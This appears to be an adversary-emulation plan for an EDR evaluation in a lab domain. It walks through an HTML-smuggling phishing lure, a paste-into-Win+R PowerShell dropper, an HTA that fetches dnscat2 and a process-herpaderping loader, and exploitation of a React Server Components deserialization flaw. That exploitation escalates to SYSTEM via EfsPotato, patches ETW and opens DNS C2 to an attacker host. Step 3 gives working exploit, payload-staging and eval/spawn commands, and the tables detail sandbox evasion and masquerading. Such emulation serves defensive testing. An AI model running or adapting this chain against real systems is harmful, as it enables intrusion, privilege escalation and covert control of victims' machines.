# Phase 1 - Initial Access & Command and Control

## Overview

The attacker targets an internal IIS server that hosts two separate web applications: `upload.testlab.local` and `react.testlab.local`. Both applications present distinct exploitation paths that are pursued in parallel.

On the first path, the attacker abuses an unrestricted file upload feature on `upload.testlab.local` to host a malicious HTML page. A targeted employee on a domain workstation is lured to visit the page, which silently delivers a dropper through a copy-paste interaction. The dropper fetches a C2 beacon and a process injector, establishing a covert dnscat2 channel over DNS from the workstation.

On the second path, the attacker directly exploits a React Server Components deserialization vulnerability (CVE-2025-55182) on `react.testlab.local` to achieve unauthenticated RCE on the IIS server itself, then escalates to `NT AUTHORITY\SYSTEM` via `SeImpersonatePrivilege`.

---

## Step 0 - Setup

> Full setup procedures are documented in [Setup.md](Setup.md).

---

## Step 1 - Initial Access: Web-Delivered Lure via HTML Smuggling

### Voice Track

After abusing the unrestricted upload feature on `upload.testlab.local`, the attacker
places a malicious HTML page at `/uploads/staging.html` and sends a targeted link to
a domain user on a workstation through a chosen social-delivery path. The page is
attacker-supplied web content hosted on victim infrastructure rather than a canonical
browser-exploit chain. It impersonates a **Microsoft Entra ID certificate compliance
portal**, displaying a spinner that reads "Checking device compliance status..." while
it runs several passive environment checks in the background - minimum viewport
**1000×700**, at least **one** browser plugin, and a non-empty **timezone other than
UTC** - to reduce execution in headless, minimal, or default-sandbox browsers. The lure
script also accumulates a client-side **user-activity score** from `mousemove` (+1) and
`keydown` (+3); after a fixed **5-second** wait, the page only reveals the remediation
UI and drops the file if that score reaches **10** and all system checks still pass. If
the page is opened on the wrong hostname it redirects to a benign Microsoft sign-in URL
(lab staging only).

If all gates pass, the page silently reconstructs a file called `cert_bundle.txt`
from a base64 payload embedded directly inside the HTML and saves it to the user's
`Downloads` folder without issuing any additional outbound HTTP request. This bypasses
proxy or DLP controls that inspect file downloads by filename or MIME type.

The page then presents a two-step instruction overlay styled as a compliance
remediation guide. It instructs the user to press **Win+R**, paste a provided
PowerShell command, and press Enter. The command is pre-loaded into the clipboard
the moment the overlay appears. Pressing Copy re-copies the same command and
confirms success visually.

The command reads `cert_bundle.txt` and executes it via `iex(gc -Raw ...)`. The
file is a polyglot: it appears to be a PEM certificate bundle on the surface, but the
PEM header and footer are wrapped in a PowerShell block comment, making the
base64 content invisible to the PowerShell interpreter. Only the decoder script
at the end of the file is executed. That script extracts the embedded HTA bytes,
drops them as a `.bin` file in `%TEMP%`, renames the file to `.hta`, and
launches it via `mshta.exe`.

### Procedures

- ☣️ Upload required files to `upload.testlab.local` via the file upload interface

  | File | Upload path |
  | - | - |
  | `staging.html` | `/uploads/staging.html` |
  | `dnscat2.exe` | `/uploads/dnscat2.exe` |
  | `CWLHerpaderping.exe` | `/uploads/CWLHerpaderping.exe` |

- ☣️ Verify the lure page is reachable from a browser that resolves
  `upload.testlab.local` to the staging server

  ```
  http://upload.testlab.local/uploads/staging.html
  ```

- Deliver the lure URL `http://upload.testlab.local/uploads/staging.html` to the
  victim user through a chosen social-delivery path, such as internal chat, email,
  or redirected intranet content

- On the victim workstation, open the URL in the browser

- During the 5-second spinner, interact lightly with the page (mouse movement or
  keyboard input) so the client-side activity score crosses the threshold

- Observe: after the delay and gates succeed, `cert_bundle.txt` is automatically
  saved to `%USERPROFILE%\Downloads\`

- On the victim workstation, follow the on-screen instructions:
  press **Win+R**, paste the command displayed on the page, press **Enter**

- ☣️ Observe on the victim workstation that `powershell.exe` is spawned with
  `-w h -ep bypass` flags and reads `cert_bundle.txt`

- ☣️ Observe that `mshta.exe` is launched with a `.hta` file from `%TEMP%`

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST multipart file upload to `upload.testlab.local` upload interface deposits attacker-controlled files in `/uploads/`; no authentication required; server accepts arbitrary file types | Not Calibrated - Not Benign | Attacker exploits unrestricted file upload vulnerability on `upload.testlab.local` to stage `staging.html`, `dnscat2.exe`, and `CWLHerpaderping.exe` on victim infrastructure | upload.testlab.local | attacker | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Files `staging.html`, `dnscat2.exe`, `CWLHerpaderping.exe` appear in `/uploads/` on `upload.testlab.local` via multipart POST; no prior authentication or session | Not Calibrated - Not Benign | Attacker transfers malware and lure page from attacker machine into victim environment via file upload vulnerability | upload.testlab.local | attacker | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html), [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Execution | T1204.001 | User Execution: Malicious Link | Windows | User opens `http://upload.testlab.local/uploads/staging.html` in `msedge.exe` / `chrome.exe` / `iexplore.exe` | Not Calibrated - Not Benign | Victim opens the attacker-provided URL in a browser; this row captures user interaction with the malicious link independent of how the link was delivered | victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Initial Access | T1189 | Drive-by Compromise | Windows | `msedge.exe` / `chrome.exe` / `iexplore.exe` connects to `http://upload.testlab.local/uploads/staging.html`; the page visit precedes browser-side staging of `cert_bundle.txt` | Not Calibrated - Not Benign | Victim visits attacker-uploaded malicious HTML content hosted on victim-owned `upload.testlab.local`; the page runs client-side checks and initiates browser-side staging. This row is retained as a broad-fit web-delivery mapping to **T1189**, but it is not a canonical exploit-on-visit drive-by flow because compromise depends on downstream user execution - **Not Calibrated** on two grounds: (1) Condition 4 fail - browser navigation to an internal hostname is indistinguishable from normal browsing within the Scenario 1 EDR surface; fair scoring would require URL reputation or content inspection outside scope; (2) Câu B Downstream - the page visit is the upstream mechanism for **T1027.006** (Calibrated); if vendor detects the file write downstream they have already observed the outcome of this step | victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `msedge.exe` / `chrome.exe` writes `%USERPROFILE%\Downloads\cert_bundle.txt` without issuing a corresponding HTTP GET request for the file | Calibrated - Not Benign | `staging.html` reconstructs `cert_bundle.txt` from base64 blob embedded in the HTML; no server request for the file | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `cert_bundle.txt` contains base64-encoded content structured between PEM `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` delimiters, concealing an HTA payload inside a file that appears to be a legitimate certificate bundle | Not Calibrated - Not Benign | Static encoding layout inside the polyglot file; same observable outcome is covered by **T1036.008** (misleading type) and **T1140** (decode at execution) which map cleanly to file-create + process/script telemetry per detection notes | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1497.001 | Virtualization/Sandbox Evasion: System Checks | Windows | No reveal/download when `environmentBlocksPayload()` is true: `screen.width < 1000` or `screen.height < 700`, `navigator.plugins.length === 0`, or timezone missing/`UTC`; passive checks in page script only; `triggerDownload()` not called | Not Calibrated - Not Benign | Checks run entirely inside the browser JS context - no distinct endpoint telemetry (process/registry/script-block) for “sandbox detected”; only indirect outcome is absence of `cert_bundle.txt`, which is ambiguous on EDR and overlaps the scored **T1027.006** download path. Aligns with methodology: internal guard/evasion logic is **Not Calibrated** for Scenario 1 | upload.testlab.local, victim-workstation | domain user | [staging.html environmentBlocksPayload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1497.002 | Virtualization/Sandbox Evasion: User Activity Based Checks | Windows | After `REVEAL_DELAY_MS` (5000), reveal and `triggerDownload()` run only if `userSignals >= USER_SIGNALS_MIN` (10); `mousemove` adds 1 and `keydown` adds 3 per event; static automated sessions often stay below threshold | Not Calibrated - Not Benign | Same rationale as **T1497.001**: `userSignals` is in-page state only - vendors cannot fairly be scored on “missed sandbox evasion” without telemetry attributable to this technique; kept for ATT&CK completeness, not denominator | victim-workstation | domain user | [staging.html userSignals / USER_SIGNALS_MIN](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1678 | Delay Execution | Windows | Fixed `REVEAL_DELAY_MS = 5000` between navigation and evaluation of user-activity + system gates; delay has no dedicated endpoint syscall/log line separate from browser timing | Not Calibrated - Not Benign | Spinner UX aligns with **T1678** (timed deferral) but EDR scoring lacks a standalone observable aside from correlating page-load time to later file events - treated as implementation detail of the gated reveal | upload.testlab.local, victim-workstation | domain user | [staging.html REVEAL_DELAY_MS](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `browser` process writes `%USERPROFILE%\Downloads\cert_bundle.txt`; filename chosen to approximate the name of a legitimate certificate export, reducing suspicion if seen in the Downloads folder | Not Calibrated - Not Benign | Payload file named `cert_bundle.txt` to approximate a legitimate certificate bundle filename; naming aspect is distinct from the polyglot file-type masquerade scored under T1036.008 | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1204.004 | User Execution: Malicious Copy and Paste | Windows | `explorer.exe` spawns `powershell.exe` with command line containing `-w h -ep bypass -c "iex(gc -Raw ...)"` (indicates Win+R Run execution) | Calibrated - Not Benign | Lure page pre-loads PowerShell one-liner into clipboard; user instructed to open Win+R, paste, and press Enter | victim-workstation | domain user | [staging.html buildCommand()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` executes with arguments `-w h -ep bypass -c "iex(gc -Raw '...\cert_bundle.txt')"` | Calibrated - Not Benign | User pastes and runs the PowerShell command from Win+R | victim-workstation | domain user | [encode-command.py build_ps_command()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `powershell.exe` reads `%USERPROFILE%\Downloads\cert_bundle.txt`, reconstructs base64 from PEM lines, and decodes via `Security.Cryptography.FromBase64Transform` into a memory stream (follow-on file write to `%TEMP%`) | Calibrated - Not Benign | Primary scored decode step: aligns with Windows detection guidance (process + script + staged file read/write chain) | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.008 | Masquerading: Masquerade File Type | Windows | `powershell.exe` writes `%TEMP%\hpsolutionsportal.bin` and renames it to `%TEMP%\hpsolutionsportal.hta` | Calibrated - Not Benign | Payload written with `.bin` extension before rename to `.hta` to mask file type during staging; filename `hpsolutionsportal` chosen to resemble a legitimate portal application | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1218.005 | System Binary Proxy Execution: Mshta | Windows | `powershell.exe` spawns `mshta.exe` with `%TEMP%\hpsolutionsportal.hta` as argument | Calibrated - Not Benign | PowerShell executes `mshta.exe` against the dropped HTA file | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.008 | Masquerading: Masquerade File Type | Windows | `powershell.exe` reads and executes script content from `%USERPROFILE%\Downloads\cert_bundle.txt` (mismatched `.txt` extension) | Calibrated - Not Benign | **Scored** masquerade row: MIME/extension imply certificate bundle while interpreter treats content as PowerShell; richest single artifact tie-in among **T1027.013 / T1036.008 / T1140** for file metadata + execution correlation | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -

> **Mapping note:** The `T1189` row captures the web-mediated initial-access context
> of the lure page, not a canonical browser-exploit chain. In this step, the attacker
> controls uploaded HTML content on victim infrastructure; actual execution is
> represented by downstream user-execution and interpreter behaviors.

---

## Step 2 - Execution: HTA Dropper Stages Follow-on Payloads

### Voice Track

Once `mshta.exe` loads `hpsolutionsportal.hta`, the embedded VBScript runs
entirely in memory. The HTA is declared with `WINDOWSTATE="minimize"` and
`SHOWINTASKBAR="no"`, so the window is intended to remain non-interactive and
absent from the taskbar. After execution completes, a `window.setTimeout
"self.close", 5000` call closes the process after five seconds.

The HTA functions as the workstation-side dropper. It performs two sequential
downloads from `upload.testlab.local`: first, it fetches `dnscat2.exe` and saves
it to `C:\ProgramData\CertCA.bin`; second, it fetches
`CWLHerpaderping.exe`, writes it to
`%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, renames it to
`CertEnrollAgent.exe`, and launches it with a hidden window. This preserves the
`.bin`-then-rename staging pattern while keeping the observable focus on script
execution, HTTP retrieval, file creation, rename, and hidden launch behavior.

The follow-on payload chain continues after the dropper completes, but the
process-herpaderping and dnscat2 C2 behaviors are treated as downstream context
here and are assessed in Step 3, where that chain is exercised in the higher-impact
server-side SYSTEM context.

### Procedures

- ☣️ Observe on the victim workstation that `mshta.exe` connects to
  `http://upload.testlab.local/uploads/dnscat2.exe` and
  `http://upload.testlab.local/uploads/CWLHerpaderping.exe`

- ☣️ Observe that `mshta.exe` creates `C:\ProgramData\CertCA.bin`

- ☣️ Observe that `mshta.exe` creates
  `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, renames it to
  `CertEnrollAgent.exe`, and launches the renamed executable with a hidden window

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.005 | Command and Scripting Interpreter: Visual Basic | Windows | `mshta.exe` executes embedded VBScript from `hpsolutionsportal.hta`; script instantiates `MSXML2.XMLHTTP`, `ADODB.Stream`, `Scripting.FileSystemObject`, and `Shell.Application` COM objects to fetch, write, rename, and execute binaries | Calibrated - Not Benign | HTA embeds VBScript that runs within `mshta.exe`; detection axis is interpreter execution rather than the downstream file-staging activity | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `mshta.exe` writes binary content to `C:\ProgramData\CertCA.bin` and `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin` via `ADODB.Stream.SaveToFile` | Calibrated - Not Benign | HTA dropper fetches and drops the follow-on payloads to disk; this row captures the dropper's staging behavior rather than the later dnscat2 C2 session | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `mshta.exe` creates `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, renamed to `CertEnrollAgent.exe` - path and name associated with legitimate Windows Certificate Enrollment components | Calibrated - Not Benign | Herpaderping loader placed under `%APPDATA%\Microsoft\Windows\` with `CertEnrollAgent.exe` name mimicking Windows certificate enrollment service; detection axis is the deceptive path/name choice rather than the broader staging flow | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `mshta.exe` terminates its own window after 5 seconds; `mshta.exe` spawns `CertEnrollAgent.exe` with `SW_HIDE` (nShow=0) flag | Not Calibrated - Not Benign | HTA `stage1.hta` declares `WINDOWSTATE="minimize"` and `SHOWINTASKBAR="no"` to keep the window minimized and absent from the taskbar; `window.setTimeout "self.close", 5000, "VBScript"` closes process after execution; `CertEnrollAgent.exe` spawned via `Shell.Application.ShellExecute` with `nShow=0` | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Windows | `mshta.exe` connects to `upload.testlab.local:80` via HTTP; GET requests to `/uploads/dnscat2.exe` and `/uploads/CWLHerpaderping.exe` are issued before file creation events | Calibrated - Not Benign | HTA VBScript uses `MSXML2.XMLHTTP` to retrieve the staged payloads over HTTP; this captures the dropper transport path, not the later DNS-based C2 channel | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -

> **Mapping note:** Step 2 intentionally maps the **HTA dropper** behaviors only:
> script execution, payload retrieval, file staging/rename, and hidden launch.
> Techniques that describe the **operational behavior of the follow-on dnscat2 C2
> channel** - such as DNS transport, encrypted C2 traffic, DNS-resolver discovery,
> and the downstream ghost-process loader chain - are not mapped here so they are
> not counted twice across the workstation and server paths. Those behaviors are
> mapped in Step 3, where the same payload chain is exercised in the higher-impact
> server-side `NT AUTHORITY\SYSTEM` context.

---

## Step 3 - Server-Side RCE & Privilege Escalation: React Server Components Exploitation (CVE-2025-55182)

### Voice Track

While the workstation attack path runs concurrently via `upload.testlab.local`,
the attacker separately exploits `react.testlab.local` - a Next.js application
running on the same IIS server under `iisnode`. A crafted React Server
Components multipart request reaches the vulnerable deserialization path and
executes JavaScript inside the Node.js worker as
`IIS APPPOOL\react.testlab.local`.

This gives the attacker direct unauthenticated code execution on the IIS server
without relying on the workstation path. The react2shell tool is then used as
the staging channel: payloads are uploaded as base64 chunks, decoded with
Node.js filesystem APIs, and launched from the still-live web RCE session.

With `CertEnrollSvc.exe` staged at `C:\Windows\Temp\`, the attacker uses the
AppPool identity's `SeImpersonatePrivilege` to run the next payload as
`NT AUTHORITY\SYSTEM`. `CertEnrollSvc.exe` is the EfsPotato variant used in this
plan; it coerces a privileged local named-pipe connection and launches the
specified command with the impersonated token.

The attacker launches `CertEnrollSvc.exe` directly from the still-live
react2shell session via `eval` + detached `spawn`, passing `CertEnrollAgent.exe`
as the argument. CertEnrollSvc acquires the SYSTEM token and uses it to start
`CertEnrollAgent.exe` - the same CWLHerpaderping binary used in the workstation
path - as `NT AUTHORITY\SYSTEM`. CertEnrollAgent then performs the same
Herpaderping loader flow as Step 2, but in a SYSTEM context on the IIS server.
The ghost process presents as `C:\Windows\System32\RuntimeBroker.exe`, and
dnscat2 establishes a DNS C2 session from the IIS host.

> Further reading: [rce-react2shell.md](further-reading/rce-react2shell.md)
> covers the exploit tool and staging flow; [efspotato.md](further-reading/efspotato.md)
> covers `CertEnrollSvc.cs`; [process-herpaderping.md](further-reading/process-herpaderping.md)
> covers `CertEnrollAgent.exe`; [dnscat2.md](further-reading/dnscat2.md)
> covers the DNS C2 client.

### Setup

- ☣️ Encode `CertEnrollSvc.exe`, `dnscat2.exe`, and `CWLHerpaderping.exe` to base64 on the attacker machine

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py ../EfsPotato/CertEnrollSvc.exe -o CertEnrollSvc.b64 -l 0
  python encode_payload.py ../dnscat2.exe -o dnscat2.b64 -l 0
  python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe -o CertEnrollAgent.b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    ```

### Procedures

- ☣️ Launch the interactive exploitation shell against the target

  ```bash
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Type 'help' for available commands
    [*] Testing connection...
    [+] Connection established!
    ```

- ☣️ Upload and decode all three payloads to the IIS server via eval (no spawn)

  ```
  upload CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.b64
  decode C:\Windows\Temp\CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.bin
  rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
  upload dnscat2.b64 C:\Windows\Temp\dnscat2.b64
  decode C:\Windows\Temp\dnscat2.b64 C:\ProgramData\CertCA.bin
  upload CertEnrollAgent.b64 C:\Windows\Temp\CertEnrollAgent.b64
  decode C:\Windows\Temp\CertEnrollAgent.b64 C:\ProgramData\CertEnrollAgent.bin
  rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output (representative)***

    ```text
    [+] File uploaded successfully -> <dest>
    [+] File decoded successfully -> <output>
    [+] File renamed successfully -> <new>
    ```

- ☣️ Launch `CertEnrollSvc.exe` (EfsPotato) via eval detached spawn - exploits `SeImpersonatePrivilege` to run `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`; react2shell session remains alive

  ```
  eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/CertEnrollSvc.exe',['C:/ProgramData/CertEnrollAgent.exe'],{detached:true,stdio:'ignore'}).unref()
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

- ☣️ Switch to the attacker machine and confirm the C2 session (SYSTEM) appears

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (iis-server) 1> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with `Next-Action: x` header and multipart body containing `"then":"$1:__proto__:then"` field; server responds with `X-Action-Redirect: /login?a=<base64>` header carrying command output | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 deserialization to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes or appends 2,000-char chunks to `C:\Windows\Temp\CertEnrollSvc.b64` via `fs.writeFileSync` and `fs.appendFileSync` | Calibrated - Not Benign | `upload` command transfers CertEnrollSvc.exe encoded as base64 in chunks via eval-based `fs` writes - no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` reads `C:\Windows\Temp\CertEnrollSvc.b64` and writes decoded bytes to `C:\Windows\Temp\CertEnrollSvc.bin`, followed by `fs.renameSync` rename to `C:\Windows\Temp\CertEnrollSvc.exe` | Calibrated - Not Benign | `decode` command decodes base64 file to PE bytes using Node.js `Buffer` API via eval, then `rename` moves the staged `.bin` to `.exe` - no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1562.006 | Impair Defenses: Indicator Blocking | Windows | `CertEnrollAgent.exe` patches `ntdll!EtwEventWrite` in its own process memory to `xor eax,eax; ret` after changing the code page protection, causing subsequent ETW writes from the loader process to return fake success | Not Calibrated - Not Benign | CWLHerpaderping tampers with ETW before entering the sensitive loader flow; accepted here as an explicit out-of-scope mapping exception because `T1562.006` is not part of the selected Scenario 1 technique set | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp PatchEtw()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Execution | T1106 | Native API | Windows | `CertEnrollAgent.exe` resolves native NT APIs from `ntdll.dll`, builds indirect syscall stubs, and uses them for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` during the Herpaderping flow | Not Calibrated - Not Benign | CWLHerpaderping invokes the sensitive process-creation path through indirect syscalls; the loader also wraps those calls with stack spoofing, but the primary ATT&CK behavior here is native API / syscall execution | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [syscall.h](../resources/payloads/CWLHerpaderping/CWLHerpaderping/syscall.h), [StackSpoof.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp) | -
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` elevates its token to `NT AUTHORITY\SYSTEM` via named pipe impersonation | Calibrated - Not Benign | CertEnrollSvc uses `SeImpersonatePrivilege` to obtain a SYSTEM impersonation token; implementation details are covered in [efspotato.md](further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
| Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonated token; child process (`CertEnrollAgent.exe`) is created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | CertEnrollSvc spawns `CertEnrollAgent.exe` as SYSTEM; implementation details are covered in [efspotato.md](further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
| Defense Evasion | T1055 | Process Injection | Windows | `CertEnrollAgent.exe` writes the payload to `%TEMP%\HD*.tmp`, creates a `SEC_IMAGE` section from that temp file, spawns a ghost process from the section with `NtCreateProcessEx`, and then overwrites the backing temp file after the in-memory image is already mapped | Calibrated - Not Benign | CWLHerpaderping performs process-herpaderping-style injection: the dnscat2 payload enters the ghost process through the image section, not by copying payload bytes with `WriteProcessMemory`; later remote-memory writes are used for metadata spoofing rather than payload injection | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns a ghost process with PPID pointing to `svchost.exe` or `wininit.exe` in Session 0 | Calibrated - Not Benign | `CertEnrollAgent.exe` chooses a Session 0 parent for the ghost process; implementation details are covered in [process-herpaderping.md](further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk | Calibrated - Not Benign | CWLHerpaderping deletes the dnscat2 payload file from disk after reading it to memory to remove forensic evidence | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` builds spoofed process parameters with `ImagePathName = C:\Windows\System32\RuntimeBroker.exe`, causing the ghost process to present a legitimate Windows path while its mapped image is the dnscat2 payload | Calibrated - Not Benign | CWLHerpaderping makes the ghost process resemble a legitimate Windows component by assigning a trusted-looking image path; this captures the masquerading outcome, while the underlying PEB rewrite is mapped separately under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `attacker.local` | Calibrated - Not Benign | dnscat2 C2 session established from IIS server as SYSTEM via Herpaderping ghost process; bootstrapped from a single react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
